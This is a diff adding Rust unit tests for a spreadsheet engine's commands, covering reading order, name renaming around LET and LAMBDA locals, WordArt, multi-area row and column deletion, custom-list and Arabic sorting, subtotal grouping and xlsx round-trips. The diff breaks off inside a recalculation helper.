@@ -19,6 +19,44 @@ fn v(s: &Session, a: &str) -> Value {
 }
 
 #[test]
+fn format_cells_reading_order_survives_undo_and_xlsx() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "مرحبا 123 ABC"})).unwrap();
+    s.execute("home.bold", json!({"range": "A1"})).unwrap();
+    s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": "RightToLeft"}}})).unwrap();
+    let alignment = |s: &Session| {
+        let d = s.doc().unwrap();
+        let style = d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::new(0, 0)));
+        assert!(style.font.bold);
+        serde_json::to_value(style.align).unwrap()
+    };
+    assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
+    s.execute("edit.undo", json!({})).unwrap();
+    assert!(alignment(&s)["reading_order"].is_null());
+    s.execute("edit.redo", json!({})).unwrap();
+    assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
+    for order in [json!("invalid"), json!(2)] {
+        assert!(s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": order}}})).is_err());
+        assert_eq!(alignment(&s)["reading_order"], "RightToLeft");
+    }
+    let wb = &s.doc().unwrap().wb;
+    let (reopened, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(wb).unwrap()).unwrap();
+    let cell = CellRef::new(0, 0);
+    assert_eq!(reopened.styles.get(reopened.active().unwrap().style_id(cell)), wb.styles.get(wb.active().unwrap().style_id(cell)));
+    assert_eq!(reopened.active().unwrap().value(cell), Value::text("مرحبا 123 ABC"));
+    for order in ["LeftToRight", "Context"] {
+        s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": order}}})).unwrap();
+        assert_eq!(alignment(&s)["reading_order"], order);
+    }
+    s.execute("home.formatCells", json!({"range": "A1", "style": {"align": {"reading_order": null}}})).unwrap();
+    assert!(alignment(&s)["reading_order"].is_null());
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(alignment(&s)["reading_order"], "Context");
+    s.execute("edit.redo", json!({})).unwrap();
+    assert!(alignment(&s)["reading_order"].is_null());
+}
+
+#[test]
 fn entering_empty_cells_preserves_whole_sheet_formatting() {
     let mut s = s();
     s.execute("cell.set", json!({"cell": "A1", "input": "existing"})).unwrap();
@@ -115,6 +153,65 @@ fn editing_a_name_renames_it_in_formulas() {
     assert_eq!(b1.text, "Cost*2");
     assert_eq!(v(&s, "B1"), Value::number(42.0));
     assert!(s.execute("formulas.defineName", json!({"name": "X", "oldName": "Missing"})).is_err());
+}
+
+/// A LET or LAMBDA local is not the defined name: renaming the name leaves a local of the same
+/// name alone, in cells and in rules.
+#[test]
+fn renaming_a_name_leaves_let_and_lambda_locals_alone() {
+    let mut s = s();
+    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=2"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A1", "input": "=LET(Rate, 3, Rate*10)+Rate"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "=LAMBDA(Rate, Rate+1)(Rate)"})).unwrap();
+    s.execute(
+        "home.conditionalFormat",
+        json!({"range": "B1:B3", "rule": {"type": "expression", "formula": "=LET(Rate, 1, Rate)<Rate"}, "style": {"fill": "#FFC7CE"}}),
+    )
+    .unwrap();
+    s.execute("formulas.defineName", json!({"name": "Fee", "refersTo": "=2", "oldName": "Rate"})).unwrap();
+    let formula =
+        |s: &Session, at: &str| s.doc().unwrap().wb.sheets[0].cell(CellRef::parse(at).unwrap()).and_then(|c| c.formula.clone()).unwrap().text.clone();
+    assert_eq!(formula(&s, "A1"), "LET(Rate,3,Rate*10)+Fee");
+    assert_eq!(formula(&s, "A2"), "LAMBDA(Rate,Rate+1)(Fee)");
+    assert_eq!(v(&s, "A1"), Value::number(32.0));
+    let rule = match &s.doc().unwrap().wb.sheets[0].cond_formats[0].rule {
+        gridcraft_model::CfRule::Expression { formula, .. } => formula.trim_start_matches('=').to_string(),
+        other => panic!("{other:?}"),
+    };
+    assert_eq!(rule, "LET(Rate,1,Rate)<Fee");
+}
+
+/// Renaming a name to one a LET local already uses where the name occurs would make the local
+/// capture it: the rename is refused and changes nothing.
+#[test]
+fn renaming_a_name_onto_a_let_local_is_refused() {
+    let mut s = s();
+    s.execute("formulas.defineName", json!({"name": "Rate", "refersTo": "=2"})).unwrap();
+    s.execute("data.validation", json!({"range": "C1:C3", "type": "custom", "formula1": "=LET(Total, 1, Rate*Total)>0"})).unwrap();
+    let before = s.doc().unwrap().wb.clone();
+    let err = s.execute("formulas.defineName", json!({"name": "Total", "refersTo": "=2", "oldName": "Rate"}));
+    assert!(err.is_err(), "the LET local would capture the renamed name");
+    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before) || *s.doc().unwrap().wb == *before);
+    assert_eq!(s.doc().unwrap().wb.names[0].name, "Rate");
+    assert_eq!(s.doc().unwrap().wb.sheets[0].validations[0].f1.trim_start_matches('='), "LET(Total, 1, Rate*Total)>0");
+}
+
+/// A sheet-level name's unqualified references are read on its sheet, so they move with edits
+/// there, and stay put for edits on other sheets.
+#[test]
+fn a_sheet_level_name_follows_edits_on_its_sheet() {
+    let mut s = s();
+    s.execute("home.insertSheet", json!({"name": "Other", "before": 1})).unwrap();
+    s.execute("range.setValues", json!({"range": "Sheet1!A2", "values": [[5]]})).unwrap();
+    s.execute("formulas.defineName", json!({"name": "LocalRef", "refersTo": "=$A$2", "scope": "Sheet1"})).unwrap();
+    let formula = |s: &Session| s.doc().unwrap().wb.names.iter().find(|n| n.name == "LocalRef").unwrap().formula.clone();
+    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Other"})).unwrap();
+    assert_eq!(formula(&s), "$A$2");
+    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
+    assert_eq!(formula(&s), "$A$3");
+    s.execute("sheet.activate", json!({"sheet": 0})).unwrap();
+    s.execute("cell.set", json!({"cell": "C1", "input": "=LocalRef"})).unwrap();
+    assert_eq!(v(&s, "C1"), Value::number(5.0));
 }
 
 #[test]
@@ -495,6 +592,118 @@ fn shape_text_edit_survives_xlsx_roundtrip() {
 }
 
 #[test]
+fn word_art_insert_respects_sheet_protection() {
+    let mut s = s();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    let before = s.doc().unwrap().wb.clone();
+    let undo_len = s.doc().unwrap().undo.len();
+    assert!(s.execute("insert.wordArt", json!({})).is_err());
+    assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
+    assert_eq!(s.doc().unwrap().undo.len(), undo_len);
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    s.execute("insert.wordArt", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes.len(), 1);
+}
+
+#[test]
+fn word_art_inserts_with_defaults_and_undoes() {
+    use gridcraft_model::ShapeKind;
+    let mut s = s();
+    // Empty params: default style and text, no dialog.
+    let r = s.execute("insert.wordArt", json!({})).unwrap();
+    assert!(s.take_ui_requests().is_empty());
+    let shape = s.doc().unwrap().wb.active().unwrap().shapes[0].clone();
+    assert_eq!(shape.id, r["shape"].as_u64().unwrap() as u32);
+    assert_eq!(shape.kind, ShapeKind::WordArt);
+    assert_eq!(shape.text, crate::cmd::wordart::DEFAULT_TEXT);
+    assert!(shape.anchor.width > 8.0 && shape.format.text_color.is_some());
+    // Named style plus overrides; restyle and edit the text through wordArt.set.
+    s.execute("insert.wordArt", json!({"style": "ember", "text": "Q3", "fontSize": 60, "shadow": false, "outline": "#112233", "outlineWidth": 3}))
+        .unwrap();
+    let ember = s.doc().unwrap().wb.active().unwrap().shapes[1].clone();
+    assert_eq!(ember.format.font_size, Some(60.0));
+    assert_eq!((ember.format.text_shadow, ember.format.text_outline.map(|o| o.1)), (None, Some(3.0)));
+    s.execute("wordArt.set", json!({"id": ember.id, "style": 3, "text": "Q4"})).unwrap();
+    let styled = s.doc().unwrap().wb.active().unwrap().shapes[1].clone();
+    assert_eq!((styled.text.as_str(), styled.format.italic), ("Q4", true));
+    s.execute("shape.setText", json!({"id": ember.id, "text": "Q5"})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[1], ember);
+    s.execute("edit.redo", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[1].text, "Q4");
+    // Moves and deletes like any floating shape.
+    s.execute("object.move", json!({"kind": "shape", "id": ember.id, "at": "D4"})).unwrap();
+    s.execute("object.delete", json!({"kind": "shape", "id": ember.id})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes.len(), 1);
+}
+
+#[test]
+fn word_art_rejects_hostile_params() {
+    let mut s = s();
+    let id = s.execute("insert.wordArt", json!({})).unwrap()["shape"].clone();
+    let rectangle = s.execute("insert.shape", json!({"kind": "rectangle"})).unwrap()["shape"].clone();
+    let before = s.doc().unwrap().wb.clone();
+    for (cmd, params) in [
+        ("insert.wordArt", json!({"style": "No Such Style"})),
+        ("insert.wordArt", json!({"style": 99})),
+        ("insert.wordArt", json!({"style": -1})),
+        ("insert.wordArt", json!({"text": 5})),
+        ("insert.wordArt", json!({"text": ""})),
+        ("insert.wordArt", json!({"text": "x".repeat(crate::cmd::wordart::MAX_CHARS + 1)})),
+        ("insert.wordArt", json!({"fill": "not a colour"})),
+        ("wordArt.set", json!({})),
+        ("wordArt.set", json!({"id": 999})),
+        ("wordArt.set", json!({"id": rectangle})),
+        ("shape.setText", json!({"id": id, "text": ""})),
+    ] {
+        assert!(matches!(s.execute(cmd, params), Err(crate::EngineError::BadParams { .. })), "{cmd}");
+        assert!(std::sync::Arc::ptr_eq(&s.doc().unwrap().wb, &before));
+    }
+    // Absurd sizes are clamped, not trusted.
+    s.execute("insert.wordArt", json!({"fontSize": 1e12, "width": 1e300, "height": -5})).unwrap();
+    let big = &s.doc().unwrap().wb.active().unwrap().shapes[2];
+    assert!(big.anchor.width <= 4000.0 && big.anchor.height >= 8.0 && big.format.font_size == Some(400.0));
+}
+
+#[test]
+fn word_art_survives_xlsx_roundtrip() {
+    use gridcraft_model::ShapeKind;
+    let mut s = s();
+    s.execute("insert.wordArt", json!({"style": "Lagoon", "text": "Sales <2026>\nOutlook & more"})).unwrap();
+    let before = s.doc().unwrap().wb.active().unwrap().shapes[0].clone();
+    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
+    s.execute("file.open", json!({"name": "wordart.xlsx", "base64": saved["base64"]})).unwrap();
+    let after = &s.doc().unwrap().wb.active().unwrap().shapes[0];
+    assert_eq!(after.kind, ShapeKind::WordArt);
+    assert_eq!(after.text, before.text);
+    assert_eq!(after.format.text_color, before.format.text_color);
+    assert_eq!(after.format.text_outline, before.format.text_outline);
+    assert_eq!(after.format.text_shadow, before.format.text_shadow);
+    assert_eq!((after.format.bold, after.format.italic, after.format.font_size), (true, true, before.format.font_size));
+    assert!(after.format.no_line);
+}
+
+/// White text with a green outline (Mint Outline) prints its outline, so it is not invisible on a
+/// white page.
+#[test]
+fn word_art_outline_prints() {
+    let mut s = s();
+    s.execute("insert.wordArt", json!({"style": "Mint Outline", "text": "VISIBLE", "at": "A1"})).unwrap();
+    let pdf = s.execute("file.exportPdf", json!({"range": "A1:G10"})).unwrap();
+    let data = crate::io::base64_decode(pdf["base64"].as_str().unwrap()).unwrap();
+    let text = String::from_utf8_lossy(&data);
+    let outline = text.matches("0.18 0.608 0.416 rg").count();
+    assert!(outline >= 1, "the outline colour (2E9B6A) is drawn");
+    assert_eq!(text.matches("(VISIBLE) Tj").count(), 9, "eight outline copies under the white text");
+    assert!(text.contains("1 1 1 rg"), "the white fill is drawn on top");
+    // The last copy drawn is the filled text, in white; every outline copy comes before it.
+    let before_fill = &text[..text.rfind("(VISIBLE) Tj").unwrap()];
+    assert!(before_fill.rfind("1 1 1 rg") > before_fill.rfind("0.18 0.608 0.416 rg"), "the white fill is drawn last");
+    assert_eq!(before_fill.matches("(VISIBLE) Tj").count(), 8);
+}
+
+#[test]
 fn no_border_clears_only_shared_edges_and_undo_restores_them() {
     use gridcraft_core::RangeRef;
     use gridcraft_model::{BorderLine, Borders};
@@ -717,6 +926,65 @@ fn deleting_a_multi_area_row_selection_removes_every_area_and_undoes_once() {
     s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2, 3, 4]]})).unwrap();
     s.execute("home.deleteColumns", json!({"cols": "A:A,C:C"})).unwrap();
     assert_eq!((v(&s, "A1"), v(&s, "B1"), v(&s, "C1")), (Value::Number(2.0), Value::Number(4.0), Value::Empty));
+}
+
+#[test]
+#[allow(clippy::disallowed_methods)] // native-only test: timing the two deletes
+fn deleting_many_separate_rows_takes_about_as_long_as_one_block() {
+    // #2287: every 10th row of a 12,000-row sheet, as 1,200 single-row areas.
+    let (rows, step) = (12_000u32, 10u32);
+    let values: Vec<serde_json::Value> = (0..rows).map(|r| json!([r, r + 100_000, r + 200_000])).collect();
+    let deleted = |r: u32| r >= 1 && (r - 1).is_multiple_of(step);
+    let list = (0..rows).filter(|&r| deleted(r)).map(|r| format!("{0}:{0}", r + 1)).collect::<Vec<_>>().join(",");
+    let build = || {
+        let mut s = s();
+        s.execute("range.setValues", json!({"range": "A1", "values": values})).unwrap();
+        s.execute("cell.set", json!({"cell": "E1", "input": format!("=SUM(A1:A{rows})")})).unwrap();
+        s.execute("cell.set", json!({"cell": "E3", "input": "=B25"})).unwrap();
+        s
+    };
+    let mut block = build();
+    let t = std::time::Instant::now();
+    block.execute("home.deleteRows", json!({"rows": format!("2:{}", rows / step + 1)})).unwrap();
+    let block_time = t.elapsed();
+
+    let mut s = build();
+    let t = std::time::Instant::now();
+    s.execute("home.deleteRows", json!({"rows": list})).unwrap();
+    let separate_time = t.elapsed();
+
+    let kept: Vec<u32> = (0..rows).filter(|&r| !deleted(r)).collect();
+    let d = s.doc().unwrap();
+    let sh = d.wb.active().unwrap();
+    assert_eq!(sh.used_range().unwrap().end.row as usize, kept.len() - 1);
+    for (i, r) in kept.iter().enumerate() {
+        assert_eq!(sh.value(CellRef::new(i as u32, 0)), Value::Number(*r as f64));
+        assert_eq!(sh.value(CellRef::new(i as u32, 2)), Value::Number((*r + 200_000) as f64));
+    }
+    assert_eq!(s.execute("cell.get", json!({"cell": "E1"})).unwrap()["formula"], format!("=SUM(A1:A{})", kept.len()));
+    // B25 loses rows 2, 12 and 22 above it; the formula itself moves from E3 to E2.
+    assert_eq!(s.execute("cell.get", json!({"cell": "E2"})).unwrap()["formula"], "=B22");
+    assert!(
+        separate_time < block_time * 20 + std::time::Duration::from_millis(500),
+        "separate rows took {separate_time:?}, one block took {block_time:?}"
+    );
+}
+
+#[test]
+fn deleting_many_separate_columns_matches_per_area_result() {
+    let mut s = s();
+    let values: Vec<serde_json::Value> = (0..50).map(|r| json!((0..40).map(|c| r * 100 + c).collect::<Vec<_>>())).collect();
+    s.execute("range.setValues", json!({"range": "A1", "values": values})).unwrap();
+    s.execute("cell.set", json!({"cell": "A60", "input": "=SUM(A1:AN1)+H2"})).unwrap();
+    // Columns B, E, H (refs) and F:G.
+    s.execute("home.deleteColumns", json!({"cols": "B:B,E:E,H:H,F:G"})).unwrap();
+    let kept: Vec<u32> = (0..40).filter(|c| ![1, 4, 5, 6, 7].contains(c)).collect();
+    for r in 0..50u32 {
+        for (i, c) in kept.iter().enumerate() {
+            assert_eq!(s.doc().unwrap().wb.active().unwrap().value(CellRef::new(r, i as u32)), Value::Number((r * 100 + c) as f64));
+        }
+    }
+    assert_eq!(s.execute("cell.get", json!({"cell": "A60"})).unwrap()["formula"], "=SUM(A1:AI1)+#REF!");
 }
 
 #[test]
@@ -1313,6 +1581,18 @@ fn scripts_leave_file_access_working_after_they_run() {
 }
 
 #[test]
+fn get_data_refuses_json_with_too_many_fields_or_rows_before_building_rows() {
+    let mut s = s();
+    let wide = format!("[{}]", (0..=gridcraft_core::MAX_COLS).map(|i| format!("{{\"k{i}\":1}}")).collect::<Vec<_>>().join(","));
+    let err = s.execute("data.fromTextCsv", json!({"text": wide})).unwrap_err().to_string();
+    assert!(err.contains("more fields"), "{err}");
+    // MAX_ROWS objects plus the header row are one too many.
+    let tall = format!("[{}]", vec!["{}"; gridcraft_core::MAX_ROWS as usize].join(","));
+    let err = s.execute("data.fromTextCsv", json!({"text": tall})).unwrap_err().to_string();
+    assert!(err.contains("more rows"), "{err}");
+}
+
+#[test]
 fn scripts_cannot_reach_outside_the_workbook_even_when_trusted() {
     let dir = std::env::temp_dir().join(format!("gridcraft-script-deny-{}", std::process::id()));
     let leak = dir.join("leak.xlsx");
@@ -1401,6 +1681,17 @@ fn protection_refuses_edits_of_locked_cells() {
 }
 
 #[test]
+fn locked_cell_message_matches_what_an_edit_would_be_refused_with() {
+    let s = protected(json!({}));
+    let locked = CellRef::parse("A1").unwrap();
+    let unlocked = CellRef::parse("D1").unwrap();
+
+    assert!(s.locked_cell_message(0, locked).is_some_and(|m| m.contains("protected sheet")));
+    assert_eq!(s.locked_cell_message(0, unlocked), None, "an unlocked cell stays editable");
+    assert_eq!(s.locked_cell_message(9, locked), None, "no such sheet");
+}
+
+#[test]
 fn protection_allows_permitted_row_and_column_edits() {
     let mut s = protected(json!({"insertRows": true, "deleteRows": true, "insertColumns": true}));
     // Inserting shifts locked cells, which the protection allows.
@@ -1446,6 +1737,66 @@ fn case_sensitive_sort_puts_lowercase_first() {
     s.execute("data.sort", json!({"range": "A1:A6", "header": false, "matchCase": true, "keys": [{"column": "A"}]})).unwrap();
     let col: Vec<Value> = (1..=6).map(|r| v(&s, &format!("A{r}"))).collect();
     assert_eq!(col, ["a", "A", "aB", "Ab", "b", "B"].map(Value::from));
+}
+
+/// #3949: Excel sorts values that are not in the custom list A to Z after the listed ones.
+#[test]
+fn custom_list_sort_puts_unlisted_values_after_the_list_in_order() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Priority"], ["Zulu"], ["Alpha"], ["Low"], ["High"], ["Medium"]]})).unwrap();
+    let key = json!({"column": "A", "order": "asc", "customList": ["High", "Medium", "Low"]});
+    s.execute("data.sort", json!({"range": "A1:A6", "header": true, "keys": [key]})).unwrap();
+    let col: Vec<Value> = (1..=6).map(|r| v(&s, &format!("A{r}"))).collect();
+    assert_eq!(col, ["Priority", "High", "Medium", "Low", "Alpha", "Zulu"].map(Value::from));
+}
+
+/// #3949 changes only an ascending custom-list key: with a descending one, two values not in the
+/// list still tie, so the next key orders them.
+#[test]
+fn descending_custom_list_sort_leaves_unlisted_values_to_the_next_key() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "N"], ["Zulu", 2], ["Alpha", 1], ["High", 3]]})).unwrap();
+    let keys = json!([
+        {"column": "A", "order": "desc", "customList": ["High", "Medium", "Low"]},
+        {"column": "B", "order": "asc"}
+    ]);
+    s.execute("data.sort", json!({"range": "A1:B4", "header": true, "keys": keys})).unwrap();
+    let col: Vec<Value> = (2..=4).map(|r| v(&s, &format!("A{r}"))).collect();
+    assert_eq!(col, ["Alpha", "Zulu", "High"].map(Value::from));
+}
+
+/// A blank in a descending custom-list key goes last, after the list, rather than tying with the
+/// values that are not in the list (which come first), so the order is the same whatever the input.
+#[test]
+fn descending_custom_list_sort_puts_blanks_last() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Name"], [null], ["High"], ["Zulu"]]})).unwrap();
+    let key = json!({"column": "A", "order": "desc", "customList": ["High", "Medium", "Low"]});
+    s.execute("data.sort", json!({"range": "A1:A4", "header": true, "keys": [key]})).unwrap();
+    let col: Vec<Value> = (2..=4).map(|r| v(&s, &format!("A{r}"))).collect();
+    assert_eq!(col, [Value::from("Zulu"), Value::from("High"), Value::Empty]);
+}
+
+#[test]
+fn data_sort_orders_vowelled_arabic_by_letters() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["بيت"], ["بَاب"], ["تمر"], ["\u{200F}بحر"]]})).unwrap();
+    s.execute("data.sort", json!({"range": "A1:A4", "header": false, "keys": [{"column": "A"}]})).unwrap();
+    let col: Vec<Value> = (1..=4).map(|r| v(&s, &format!("A{r}"))).collect();
+    assert_eq!(col, ["بَاب", "\u{200F}بحر", "بيت", "تمر"].map(Value::from));
+}
+
+#[test]
+fn data_sort_orders_marks_and_digit_scripts_like_excel() {
+    // Excel 16.0 (build 20527, en-US) sorts this column, as text, into exactly this order.
+    let want = ["١٢", "۱۲", "ب\u{064E}1", "ب\u{064E}١", "بa", "\u{200F}باب", "ب\u{064B}اب", "ب\u{064E}اب", "ب\u{0652}اب", "ب\u{0651}اب"];
+    let mut s = s();
+    s.execute("home.numberFormat", json!({"range": "A1:A10", "code": "@"})).unwrap();
+    let input: Vec<Vec<&str>> = want.iter().rev().map(|t| vec![*t]).collect();
+    s.execute("range.setValues", json!({"range": "A1", "values": input})).unwrap();
+    s.execute("data.sort", json!({"range": "A1:A10", "header": false, "keys": [{"column": "A"}]})).unwrap();
+    let col: Vec<Value> = (1..=10).map(|r| v(&s, &format!("A{r}"))).collect();
+    assert_eq!(col, want.map(Value::from));
 }
 
 #[test]
@@ -1564,12 +1915,30 @@ fn subtotal_with_a_sheet_prefix_works_on_the_named_sheet() {
     assert_eq!(col(prices, 0), ["Item", "a", "a", "a Total", "b", "b Total", "Grand Total"].map(Value::from));
     assert_eq!(col(prices, 1)[1..], [1.0, 2.0, 3.0, 4.0, 4.0, 7.0].map(Value::from));
     assert!(wb.styles.get(prices.style_id(CellRef::new(3, 0))).font.bold);
-    assert_eq!(prices.rows.get(&1).map(|l| l.outline), Some(1));
+    assert_eq!(prices.rows.get(&1).map(|l| l.outline), Some(2));
     let sheet1 = wb.sheet(wb.sheet_index("Sheet1").unwrap()).unwrap();
     assert_eq!(col(sheet1, 0)[..4], ["Name", "x", "x", "y"].map(Value::from));
     assert!(sheet1.value(CellRef::new(4, 0)).is_empty());
     assert!(sheet1.rows.values().all(|l| l.outline == 0));
     assert!(s.execute("data.group", json!({"sheet": "Prices"})).is_err());
+}
+
+/// #3945: Excel groups every data and subtotal row under the grand total, so the details are at
+/// level 2, the subtotals at level 1, and showing level 1 leaves only the grand total.
+#[test]
+fn subtotal_groups_everything_under_the_grand_total() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Group", "Amount"], ["A", 10], ["A", 20], ["B", 30]]})).unwrap();
+    s.execute("data.subtotal", json!({"range": "A1:B4", "groupBy": "A", "columns": ["B"], "function": "sum"})).unwrap();
+    let sh = s.doc().unwrap().wb.active().unwrap();
+    let levels: Vec<u8> = (0..7).map(|r| sh.rows.get(&r).map_or(0, |l| l.outline)).collect();
+    assert_eq!(levels, [0, 2, 2, 1, 2, 1, 0]);
+    let shown = |s: &Session| -> Vec<u32> { (0..7).filter(|&r| !s.doc().unwrap().wb.active().unwrap().is_row_hidden(r)).map(|r| r + 1).collect() };
+    s.execute("data.showLevels", json!({"rows": 1})).unwrap();
+    assert_eq!(shown(&s), [1, 7]);
+    s.execute("data.showLevels", json!({"rows": 2})).unwrap();
+    assert_eq!(shown(&s), [1, 4, 6, 7]);
+    assert_eq!(v(&s, "B7"), Value::Number(60.0));
 }
 
 #[test]
@@ -1833,6 +2202,20 @@ fn table_rename_keeps_a_defined_name_with_the_same_name() {
     assert_eq!((v(&s, "E1"), v(&s, "F1")), (Value::Number(100.0), Value::Number(7.0)));
 }
 
+/// A workbook name that reads a same-named workbook name keeps reading it when the table is renamed.
+#[test]
+fn table_rename_keeps_a_workbook_name_reading_a_same_named_name() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Qty"], [7]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "D1", "input": "100"})).unwrap();
+    s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "Data"})).unwrap();
+    s.execute("formulas.defineName", json!({"name": "Data", "refersTo": "=Sheet1!$D$1"})).unwrap();
+    s.execute("formulas.defineName", json!({"name": "Twice", "refersTo": "=Data*2"})).unwrap();
+    s.execute("table.rename", json!({"table": "Data", "name": "Later"})).unwrap();
+    let twice = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Twice").map(|n| n.formula.clone());
+    assert_eq!(twice.as_deref(), Some("Data*2"));
+}
+
 #[test]
 fn table_names_are_limited_to_255_characters() {
     let mut s = s();
@@ -2057,6 +2440,19 @@ fn formula_at(s: &Session, a: &str) -> Option<String> {
 }
 
 #[test]
+fn autosum_of_a_single_cell_stops_at_a_blank_cell() {
+    // #3291: a blank row between two blocks of numbers ended the guess one block too late, so the
+    // second total summed the first block (and its total) as well.
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "B4", "values": [[1], [2], [3]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "B7", "input": "=SUM(B4:B6)"})).unwrap();
+    s.execute("range.setValues", json!({"range": "B9", "values": [[10], [20]]})).unwrap();
+    s.execute("selection.set", json!({"cell": "B11"})).unwrap();
+    s.execute("formulas.autoSum", json!({})).unwrap();
+    assert_eq!(v(&s, "B11"), Value::Number(30.0));
+}
+
+#[test]
 fn autosum_over_a_row_totals_it_to_the_right() {
     // As in Excel: a row selected and AutoSum puts one total to its right, not a one-cell total
     // under each of its cells.
@@ -2191,6 +2587,35 @@ fn merging_over_a_spill_blocks_it_and_unmerging_unblocks_it() {
     s.execute("home.mergeCenter", json!({"range": "A2:B3"})).unwrap();
     assert_eq!(v(&s, "A1"), Value::Number(1.0));
     assert_eq!(v(&s, "A3"), Value::Number(3.0));
+}
+
+#[test]
+fn inserting_a_link_without_text_preserves_a_spill_child() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)"})).unwrap();
+    assert_eq!(v(&s, "A2"), Value::Number(2.0));
+    s.execute("insert.link", json!({"cell": "A2", "target": "https://example.org"})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::Number(1.0));
+    assert_eq!(v(&s, "A2"), Value::Number(2.0));
+    let d = s.doc().unwrap();
+    let at = CellRef::parse("A2").unwrap();
+    assert_eq!(d.wb.active().unwrap().hyperlinks.get(&at).map(|link| link.target.as_str()), Some("https://example.org"));
+}
+
+#[test]
+fn inserting_a_link_without_text_preserves_an_empty_spill_child() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1:C3", "values": [["a", "x", 1], ["b", "x", 2], ["a", "y", 3]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "K1", "input": "=PIVOTBY(A1:A3,B1:B3,C1:C3,LAMBDA(x,SUM(x)))"})).unwrap();
+    assert_eq!(v(&s, "K1"), Value::Empty);
+    let at = CellRef::parse("M3").unwrap();
+    assert_eq!(v(&s, "M3"), Value::Empty);
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().spill_anchor(at), Some(CellRef::parse("K1").unwrap()));
+    s.execute("insert.link", json!({"cell": "M3", "target": "https://example.org"})).unwrap();
+    assert_eq!(v(&s, "K1"), Value::Empty);
+    assert_eq!(v(&s, "M3"), Value::Empty);
+    let d = s.doc().unwrap();
+    assert_eq!(d.wb.active().unwrap().hyperlinks.get(&at).map(|link| link.target.as_str()), Some("https://example.org"));
 }
 
 #[test]
@@ -2400,6 +2825,36 @@ fn deleting_a_3d_span_end_sheet_keeps_the_rest() {
         s.execute("sheet.activate", json!({"sheet": "Results"})).unwrap();
         assert_eq!(v(&s, "A1"), Value::Number(total), "deleting {deleted}");
         assert_eq!(v(&s, "B1"), direct, "deleting {deleted}");
+    }
+}
+
+#[test]
+fn workbook_view_roundtrips_after_sheet_deletion_and_reordering() {
+    let view = gridcraft_model::WorkbookView { show_sheet_tabs: false, show_horizontal_scroll: true, show_vertical_scroll: false, tab_ratio: 350 };
+    for (initial_active, command, params, expected_order, expected_active) in [
+        ("Third", "home.deleteSheet", json!({"sheet": "First"}), vec!["Second", "Third"], 1),
+        ("Third", "home.deleteSheet", json!({"sheet": "Third"}), vec!["First", "Second"], 1),
+        ("First", "home.deleteSheet", json!({"sheet": "Third"}), vec!["First", "Second"], 0),
+        ("Third", "sheet.move", json!({"sheet": "Third", "to": 0}), vec!["Third", "First", "Second"], 0),
+        ("Third", "sheet.move", json!({"sheet": "First", "to": 2}), vec!["Second", "Third", "First"], 2),
+    ] {
+        let mut session = s();
+        session.execute("sheet.rename", json!({"name": "First"})).unwrap();
+        for name in ["Second", "Third"] {
+            session.execute("home.insertSheet", json!({"name": name})).unwrap();
+        }
+        std::sync::Arc::make_mut(&mut session.doc_mut().unwrap().wb).view = view;
+        session.execute("sheet.activate", json!({"sheet": initial_active})).unwrap();
+        session.execute(command, params).unwrap();
+
+        let wb = &session.doc().unwrap().wb;
+        assert_eq!(wb.active_sheet(), expected_active, "{command}");
+        assert_eq!(wb.sheets.iter().map(|s| s.name.as_str()).collect::<Vec<_>>(), expected_order, "{command}");
+        let (back, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(wb).unwrap()).unwrap();
+        assert_eq!(back.sheets.iter().map(|s| s.name.as_str()).collect::<Vec<_>>(), expected_order, "{command} after reopening");
+        assert_eq!(back.active_sheet(), expected_active, "activeTab follows {command}");
+        assert_eq!(back.active().unwrap().name, expected_order[expected_active], "the active sheet is not a stale index");
+        assert_eq!(back.view, view, "workbook display settings survive {command}");
     }
 }
 
@@ -2702,6 +3157,200 @@ fn validation_formulas_are_relative_and_see_the_new_value() {
     assert!(!ok(&mut s, "C1", "50"));
 }
 
+/// Every value of the active sheet as the incremental recalculation left it must equal a full one.
+fn assert_matches_full_recalc(s: &Session) {
+    let wb = &s.doc().unwrap().wb;
